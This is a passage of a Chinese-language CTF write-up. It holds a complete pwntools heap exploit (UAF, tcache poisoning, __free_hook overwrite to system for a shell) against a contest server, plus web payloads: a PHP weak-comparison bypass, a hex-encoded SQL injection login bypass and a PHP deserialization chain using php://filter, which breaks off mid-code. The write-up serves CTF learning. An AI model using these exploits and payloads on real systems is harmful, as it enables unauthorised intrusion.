punctuation">)</span></pre></td></tr></table></figure><h4 id="untidy_note"><a class="anchor" href="#untidy_note">#</a> untidy_note</h4><p>漏洞点：</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220525174911350.png" alt="image-20220525174911350"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220525174816013.png" alt="image-20220525174816013"></p><p>因为 free 掉后 没有清空指针 导致产生了 uaf 漏洞 配合堆溢出 即可 getshell</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment"># r = process('./pwn3')</span></pre></td></tr><tr><td data-num="6"></td><td><pre>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'123.57.69.203'</span><span class="token punctuation">,</span> <span class="token number">7030</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.27.so'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>s <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span> data<span class="token punctuation">:</span> r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>delim<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">:</span> r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span> data<span class="token punctuation">:</span> r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>delim<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    pause<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    sla<span class="token punctuation">(</span><span class="token string">'choose is:\n'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    sla<span class="token punctuation">(</span><span class="token string">'the note size is:\n'</span><span class="token punctuation">,</span>size<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    sla<span class="token punctuation">(</span><span class="token string">'Your choose is:\n'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    sla<span class="token punctuation">(</span><span class="token string">'index:\n'</span><span class="token punctuation">,</span>idx<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    sla<span class="token punctuation">(</span><span class="token string">'choose is:\n'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    sla<span class="token punctuation">(</span><span class="token string">'index:\n'</span><span class="token punctuation">,</span>idx<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    sla<span class="token punctuation">(</span><span class="token string">'the size is:\n'</span><span class="token punctuation">,</span>size<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    sa<span class="token punctuation">(</span><span class="token string">'Content:\n'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    sla<span class="token punctuation">(</span><span class="token string">'choose is:\n'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    sla<span class="token punctuation">(</span><span class="token string">'index:\n'</span><span class="token punctuation">,</span>idx<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre></pre></td></tr><tr><td data-num="36"></td><td><pre>sl<span class="token punctuation">(</span><span class="token string">'aaa'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="39"></td><td><pre>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="40"></td><td><pre>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="41"></td><td><pre>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="42"></td><td><pre>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content:"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre>heap <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x00'</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x250</span></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>heap<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="45"></td><td><pre></pre></td></tr><tr><td data-num="46"></td><td><pre>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>heap<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="47"></td><td><pre>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="48"></td><td><pre>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="49"></td><td><pre>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="50"></td><td><pre>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="51"></td><td><pre>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="52"></td><td><pre></pre></td></tr><tr><td data-num="53"></td><td><pre>edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="54"></td><td><pre>delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="55"></td><td><pre>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>heap <span class="token operator">+</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="56"></td><td><pre>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="57"></td><td><pre>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="58"></td><td><pre>edit<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0x7000000</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="59"></td><td><pre>delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="60"></td><td><pre>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="61"></td><td><pre>show<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="62"></td><td><pre></pre></td></tr><tr><td data-num="63"></td><td><pre>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content:"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="64"></td><td><pre>base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x00'</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3ebee0</span></pre></td></tr><tr><td data-num="65"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'base:'</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="66"></td><td><pre>free <span class="token operator">=</span> base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="67"></td><td><pre>system <span class="token operator">=</span> base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="68"></td><td><pre>edit<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="69"></td><td><pre>delete<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="70"></td><td><pre>edit<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="71"></td><td><pre>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="72"></td><td><pre>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="73"></td><td><pre>edit<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="74"></td><td><pre>edit<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">"./bin/sh\x00"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="75"></td><td><pre>delete<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="76"></td><td><pre></pre></td></tr><tr><td data-num="77"></td><td><pre>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220525174234337.png" alt="image-20220525174234337"></p><h2 id="web"><a class="anchor" href="#web">#</a> WEB</h2><h4 id="冬奥会"><a class="anchor" href="#冬奥会">#</a> 冬奥会</h4><p>这个题就是一个简单的代码审计</p><pre><code class="language-PHP">&lt;?php

show_source(__FILE__);

$Step1=False;
$Step2=False;

$info=(array)json_decode(@$_GET['Information']);//接受get的传参的json格式，转换为数组格式

if(is_array($info))&#123;//判断是不是数组格式

    var_dump($info);

    is_numeric(@$info[&quot;year&quot;])?die(&quot;Sorry~&quot;):NULL;//检查year是不是数字或者数字字符串，是则结束
    if(@$info[&quot;year&quot;])&#123;
        ($info[&quot;year&quot;]=2022)?$Step1=True:NULL;
    &#125;
    if(is_array(@$info[&quot;items&quot;]))&#123;
        if(!is_array($info[&quot;items&quot;][1])OR count($info[&quot;items&quot;])!==3 ) die(&quot;Sorry~&quot;);//判断items是一个3个量的数组且第二个值的类型是一个数组
        $status = array_search(&quot;skiing&quot;, $info[&quot;items&quot;]);
        $status===false?die(&quot;Sorry~&quot;):NULL;//判断数组中是否有skiing这个字符串，没有则结束
        foreach($info[&quot;items&quot;] as $key=&gt;$val)&#123;
            $val===&quot;skiing&quot;?die(&quot;Sorry~&quot;):NULL;//判断数组中是否有skiing这个字符串，有则结束
        &#125;
        $Step2=True;
    &#125;
&#125;

if($Step1 &amp;&amp; $Step2)&#123;
    include &quot;2022flag.php&quot;;echo $flag;//文件包含打印flag
&#125;
?&gt; 
</code></pre><p>要注意的点我写在代码的注释中了，首先传入格式是 json，有个变量为 year 值不能是数字或者数字字符串，有个数组 iteam，然后要对数组第二个进行判断不是数组为 3 个值则进入 if 条件句满足两个条件跳过 if 语句，接着用 array_seach 判断数组中是否有 skiing 没有则退出，然后又用 foreach 判断有则退出，这里判断原理是弱等于，用 0 就可以绕过所以最终 payload</p><figure class="highlight url"><figcaption data-lang="url"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">Information</span>=</span></span>&#123;"year":"a","items":[0,[],2]&#125;</pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220518165416498.png" alt="image-20220518165416498"></p><h4 id="爱国敬业好青年-2"><a class="anchor" href="#爱国敬业好青年-2">#</a> 爱国敬业好青年 - 2</h4><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220518184331689.png" alt="image-20220518184331689"></p><p>页面就是一个请找到爱国敬业好青年所处的城市（前一个题一直零解，，前一个题一直零解，我只想把出题人关小黑屋抄 100，，不 200 遍社会主义核心价值观），通过前一个题</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220518205949672.png" alt="image-20220518205949672"></p><p>可以判断应该是北京天安门的坐标，输入了他给了个假的 flag，我还去试了半天（哭晕在厕所）输什么他都会给这个假的 flag</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220518210629313.png" alt="image-20220518210629313"></p><p>Ctrl+u 看源码</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220518210543869.png" alt="image-20220518210543869"></p><p>有个 info 路由，进去是刚刚那个假的 flag，往上看 form 标签，有个 action 规定当提交表单时向 flag 发送表单数据，method 规定了以 post 提交，用 hackbar 提交数据</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220518211322294.png" alt="image-20220518211322294"></p><h4 id="pop2022"><a class="anchor" href="#pop2022">#</a> Pop2022</h4><p>这个题当时是非预期解做的，直接访问 flag.php 得到 flag，应该是文件没删，后来被修改了</p><h4 id="easy-sql"><a class="anchor" href="#easy-sql">#</a> Easy-SQL</h4><p>看题目是一个 sql 的题</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220518213817064.png" alt="image-20220518213817064"></p><p>提示我们找数据库名？尝试用 id</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220518214135491.png" alt="image-20220518214135491"></p><p>这个回显怎么说，像是 sql-labs 靶场，先用 sqlmap 扫描一下</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220518214417226.png" alt="image-20220518214417226"></p><p>只能知道数据库是 securitymysql 数据库版本是 8</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220518214029540.png" alt="image-20220518214029540"></p><p>这个地方的 flag 是假的，id 等于 8 的时候</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220518214605462.png" alt="image-20220518214605462"></p><p>看到提示让猜邮箱，security 数据库中有一个 emails 的表，mysql8.0 开始新版的特性可以使用 table user 替换 select * from，这里用联合查询且用 limit 去截取 emails 表中的数据，截取到第 7 个的时候发现一个压缩包，先下载下来看看</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220518215644798.png" alt="image-20220518215644798"></p><p>打开下载的文件</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220518215509119.png" alt="image-20220518215509119"></p><p>这里可以看到还可以用 post 传入数据带入 sql 语句</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220518220043951.png" alt="image-20220518220043951"></p><p>且这里只对 passwd 进行了严格的过滤，我们可以在 username 这个地方插入语句用单引号闭合前面的引号，对 username 判断是不是等于 admin，对 username 转化的数组的 passwd 部分与 passwd 比较，这里先判断几个字段，这个题的源码越审越感觉见过</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220518221330323.png" alt="image-20220518221330323"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220518221353598.png" alt="image-20220518221353598"></p><p>4 个字段没反应，3 个字段正常回显，这里可以判断是 3 个字段</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220518221515614.png" alt="image-20220518221515614"></p><p>这里经测试是第三个字段为密码，又提示说错误的 user，尝试用 admin 去替换 1，2</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220518221900144.png" alt="image-20220518221900144"></p><p>都没反应？这是过滤了？admin 出现就没反应了，尝试用 16 进制绕过</p><p>username=1' union select 1,0x61646d696e,3#&amp;passwd=3</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220518222126997.png" alt="image-20220518222126997"></p><h4 id="findme"><a class="anchor" href="#findme">#</a> findme</h4><p>这个题打开就一张图片</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220521233627739.png" alt="image-20220521233627739"></p><p>看源码发现注释了有一个文件</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220521233714398.png" alt="image-20220521233714398"></p><p>打开这个文件，看到是一个 php 的代码审计</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">a</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$un0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$un1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$un2</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$un3</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$un4</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    </pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">// 魔术方法，当类被实例化时自动调用</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">un0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">un2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">// 当变量 un0 存在，un2 不存在时进入 if 条件句</span></pre></td></tr><tr><td data-num="13"></td><td><pre>            <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token function">Givemeanew</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 调用 Givemeanew 方法</span></pre></td></tr><tr><td data-num="14"></td><td><pre>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">un3</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'unserialize'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">// 当 un3 等于 unserialize 进入 if 条件句</span></pre></td></tr><tr><td data-num="15"></td><td><pre>                <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token function">yigei</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 调用 yigei 函数</span></pre></td></tr><tr><td data-num="16"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>                <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token function">giao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 调用 giao 函数</span></pre></td></tr><tr><td data-num="19"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">Givemeanew</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">un4</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">un0</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">un1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 将 un0 的参数实例化赋值给 un4</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="26"></td><td><pre></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">yigei</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your output: '</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">un4</span><span class="token punctuation">;</span><span class="token comment">// 打印 un4 的值</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    </pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">giao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">un2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 代码执行函数</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    </pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>        <span class="token keyword">include</span> <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">un2</span><span class="token operator">.</span><span class="token string single-quoted-string">'hint.php'</span><span class="token punctuation">;</span><span class="token comment">// 文件包含函数</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="39"></td><td><pre></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>发现有一个 hint 文件，先用伪协议去读这个文件</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">a</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$un2</span><span class="token operator">=</span><span class="token string double-quoted-string">"php://filter/read=convert.base64-encode/resource="</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token keyword">include</span> <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">un2</span><span class="token operator">.</span><span class="token string single-quoted-string">'hint.php'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token 